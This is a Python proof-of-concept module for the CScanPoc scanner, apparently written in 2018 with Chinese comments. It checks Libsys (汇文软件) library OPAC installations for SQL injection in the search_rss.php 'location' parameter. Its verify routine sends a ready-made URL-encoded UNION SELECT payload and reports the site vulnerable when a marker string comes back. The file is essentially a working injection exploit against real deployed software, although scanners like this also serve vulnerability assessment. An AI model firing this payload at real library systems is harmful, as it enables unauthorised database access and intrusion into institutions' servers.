# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Libsys_0003' # 平台漏洞编号，留空
    name = '汇文软件 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        汇文软件（Libsys）SQL注入漏洞。
        /opac/search_rss.php?location=
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '汇文软件'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '8fc9c893-f2e3-4068-ab43-a22e59f365fb'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/opac/search_rss.php?location=ALL%27%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28100%29%7C%7CCHR%28108%29%7C%7CCHR%2898%29%7C%7CCHR%28104%29%7C%7CCHR%28120%29%7C%7CCHR%2871%29%7C%7CCHR%28112%29%7C%7CCHR%28105%29%7C%7CCHR%28108%29%7C%7CCHR%2881%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--%20&title=ccc&doctype=ALL&lang_code=ALL&match_flag=forward&displaypg=20&showmode=list&orderby=DESC&sort=CATA_DATE&onlylendable=yes&with_ebook=&with_ebook='
            verifu_url = self.target + payload
            r = requests.get(verifu_url)

            if r.status_code == 200 and 'qvpzqdlbhxGpilQqzxqq' in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
